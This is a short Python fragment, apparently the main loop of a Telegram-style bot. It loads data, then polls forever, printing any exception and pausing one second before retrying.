    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(1)
